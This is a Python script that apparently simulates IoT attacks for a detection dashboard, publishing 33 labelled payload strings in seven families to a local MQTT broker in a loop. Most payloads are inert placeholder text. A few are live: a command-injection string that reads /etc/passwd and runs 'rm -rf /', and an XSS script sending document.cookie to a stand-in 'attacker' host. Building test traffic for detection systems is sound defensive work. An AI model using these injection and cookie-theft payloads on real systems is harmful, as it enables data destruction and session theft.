import time
import paho.mqtt.client as mqtt

# Connect to local Mosquitto broker container
broker_host = "localhost"
broker_port = 1883

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1)
client.connect(broker_host, broker_port, 60)

print("=" * 70)
print("🚀 CIC-IoT-2023 COMPLETE 33-VECTOR COMPREHENSIVE TEST SUITE")
print("=" * 70)

# Full matrix covering all 7 families and 33 specific attack definitions
complete_attack_suite = [
    # --- FAMILY 1: DDoS (12 Variants) ---
    {
        "family": "1. DDoS",
        "name": "ACK Fragmentation",
        "topic": "iot/device/ddos_node_01",
        "payload": "ACK_FRAG_FLOOD_" + ("A" * 1200),
    },
    {
        "family": "1. DDoS",
        "name": "HTTP Flood",
        "topic": "iot/device/ddos_node_02",
        "payload": "GET / HTTP/1.1 Host: mqtt_broker User-Agent: Botnet Flood",
    },
    {
        "family": "1. DDoS",
        "name": "ICMP Flood",
        "topic": "iot/device/ddos_node_03",
        "payload": "ICMP_ECHO_REQUEST_FLOOD_PACKET_" + ("I" * 1100),
    },
    {
        "family": "1. DDoS",
        "name": "ICMP Fragmentation",
        "topic": "iot/device/ddos_node_04",
        "payload": "ICMP_FRAG_OVERFLOW_" + ("F" * 1300),
    },
    {
        "family": "1. DDoS",
        "name": "PSH-ACK Flood",
        "topic": "iot/device/ddos_node_05",
        "payload": "TCP_PSH_ACK_FLAG_STORM_" + ("P" * 1250),
    },
    {
        "family": "1. DDoS",
        "name": "RST-FIN Flood",
        "topic": "iot/device/ddos_node_06",
        "payload": "TCP_RST_FIN_TEARDOWN_FLOOD_" + ("R" * 1150),
    },
    {
        "family": "1. DDoS",
        "name": "SYN Flood",
        "topic": "iot/device/ddos_node_07",
        "payload": "SYN_PACKET_QUEUE_EXHAUSTION_" + ("S" * 1400),
    },
    {
        "family": "1. DDoS",
        "name": "SlowLoris",
        "topic": "iot/device/ddos_node_08",
        "payload": "X-a: b\r\n" * 100,
    },
    {
        "family": "1. DDoS",
        "name": "Synonymous IP Flood",
        "topic": "iot/device/ddos_node_09",
        "payload": "SPOOFED_IP_SYN_STORM_" + ("Z" * 1350),
    },
    {
        "family": "1. DDoS",
        "name": "TCP Flood",
        "topic": "iot/device/ddos_node_10",
        "payload": "GENERIC_TCP_SOCKET_FLOOD_" + ("T" * 1200),
    },
    {
        "family": "1. DDoS",
        "name": "UDP Flood",
        "topic": "iot/device/ddos_node_11",
        "payload": "UDP_STREAM_EXHAUSTION_" + ("U" * 1400),
    },
    {
        "family": "1. DDoS",
        "name": "UDP Fragmentation",
        "topic": "iot/device/ddos_node_12",
        "payload": "UDP_FRAG_PAYLOAD_STORM_" + ("V" * 1300),
    },
    # --- FAMILY 2: DoS (4 Variants) ---
    {
        "family": "2. DoS",
        "name": "HTTP Flood (Single Source)",
        "topic": "iot/device/dos_node_01",
        "payload": "SINGLE_SOURCE_HTTP_GET_STORM",
    },
    {
        "family": "2. DoS",
        "name": "SYN Flood (Single Source)",
        "topic": "iot/device/dos_node_02",
        "payload": "SINGLE_SOURCE_SYN_EXHAUSTION",
    },
    {
        "family": "2. DoS",
        "name": "TCP Flood (Single Source)",
        "topic": "iot/device/dos_node_03",
        "payload": "SINGLE_SOURCE_TCP_BUFFER_OVERFLOW",
    },
    {
        "family": "2. DoS",
        "name": "UDP Flood (Single Source)",
        "topic": "iot/device/dos_node_04",
        "payload": "SINGLE_SOURCE_UDP_BANDWIDTH_DRAIN",
    },
    # --- FAMILY 3: Mirai Botnet (3 Variants) ---
    {
        "family": "3. Mirai Botnet",
        "name": "Greeth Flood",
        "topic": "iot/device/compromised_cam_01",
        "payload": "MIRAI_GREETH_PAYLOAD_VECTOR_" + ("M" * 1350),
    },
    {
        "family": "3. Mirai Botnet",
        "name": "Greip Flood",
        "topic": "iot/device/compromised_cam_02",
        "payload": "MIRAI_GREIP_HEADER_INJECTION_" + ("N" * 1300),
    },
    {
        "family": "3. Mirai Botnet",
        "name": "UDP Plain",
        "topic": "iot/device/compromised_cam_03",
        "payload": "MIRAI_UDP_PLAIN_STREAM_" + ("O" * 1400),
    },
    # --- FAMILY 4: Reconnaissance (4 Variants) ---
    {
        "family": "4. Reconnaissance",
        "name": "Host Discovery Probe",
        "topic": "iot/device/scanner_node",
        "payload": "ICMP_HOST_DISCOVERY_PROBE_SCAN",
    },
    {
        "family": "4. Reconnaissance",
        "name": "OS Fingerprint Scan",
        "topic": "iot/device/scanner_node",
        "payload": "TCP_NULL_FIN_XMAS_OS_PROBE",
    },
    {
        "family": "4. Reconnaissance",
        "name": "Ping Sweep",
        "topic": "iot/device/scanner_node",
        "payload": "SUBNET_PING_SWEEP_REQUEST",
    },
    {
        "family": "4. Reconnaissance",
        "name": "Port Scan (MQTT 1883)",
        "topic": "iot/device/scanner_node",
        "payload": "TCP_SYN_SCAN_PORT_1883_PROBE",
    },
    # --- FAMILY 5: Brute Force (2 Variants) ---
    {
        "family": "5. Brute Force",
        "name": "Dictionary Brute Force",
        "topic": "iot/device/gateway_auth",
        "payload": "AUTH_FAIL_DICTIONARY_ADMIN_ROOT_123456",
    },
    {
        "family": "5. Brute Force",
        "name": "Password Guessing",
        "topic": "iot/device/gateway_auth",
        "payload": "EXHAUSTIVE_PASSWORD_GUESS_ATTEMPT",
    },
    # --- FAMILY 6: Web-Based Attacks (3 Variants) ---
    {
        "family": "6. Web-Based Attacks",
        "name": "Browser Hijacking",
        "topic": "iot/device/hub_web_portal",
        "payload": "DOM_BASED_XSS_SESSION_HIJACK_PAYLOAD",
    },
    {
        "family": "6. Web-Based Attacks",
        "name": "Command Injection",
        "topic": "iot/device/hub_web_portal",
        "payload": "ADMIN; /bin/cat /etc/passwd; rm -rf /;",
    },
    {
        "family": "6. Web-Based Attacks",
        "name": "SQL Injection",
        "topic": "iot/device/hub_web_portal",
        "payload": "SELECT * FROM users WHERE username = 'admin'--",
    },
    # --- FAMILY 7: Spoofing / MITM (5 Variants) ---
    {
        "family": "7. Spoofing / MITM",
        "name": "ARP Spoofing",
        "topic": "iot/device/spoofed_sensor",
        "payload": "ARP_CACHE_POISONING_MAC_SPOOF",
    },
    {
        "family": "7. Spoofing / MITM",
        "name": "DNS Spoofing",
        "topic": "iot/device/spoofed_sensor",
        "payload": "DNS_REDIRECTION_MALICIOUS_IP_MAPPING",
    },
    {
        "family": "7. Spoofing / MITM",
        "name": "Backdoor Malware Payload",
        "topic": "iot/device/spoofed_sensor",
        "payload": "REVERSE_SHELL_PAYLOAD_EXECUTION_HOOK",
    },
    {
        "family": "7. Spoofing / MITM",
        "name": "File Upload Exploit",
        "topic": "iot/device/spoofed_sensor",
        "payload": "MALICIOUS_FIRMWARE_BINARY_UPLOAD_SHELL",
    },
    {
        "family": "7. Spoofing / MITM",
        "name": "Cross-Site Scripting (XSS)",
        "topic": "iot/device/spoofed_sensor",
        "payload": "<script>fetch('http://attacker/steal?cookie='+document.cookie)</script>",
    },
]

try:
  print(
      f"[*] Initialized test suite with {len(complete_attack_suite)} specific"
      " vectors across 7 families."
  )
  print(
      "[*] Streaming packets to local broker. Press Ctrl+C to stop at any"
      " time.\n"
  )

  while True:
    for attack in complete_attack_suite:
      print(
          f"🛡️ Testing [{attack['family']}] -> Vector: {attack['name']} | Topic:"
          f" {attack['topic']}"
      )
      client.publish(attack["topic"], attack["payload"])
      time.sleep(1.0)  # Smooth pacing so the dashboard logs visibly

    print(
        "\n"
        + "=" * 70
        + "\n✨ Completed full loop of all 33 attacks! Restarting cycle..."
        + "\n"
        + "=" * 70
        + "\n"
    )
    time.sleep(3.0)

except KeyboardInterrupt:
  print("\n[!] Simulation test suite stopped by user.")
  client.disconnect()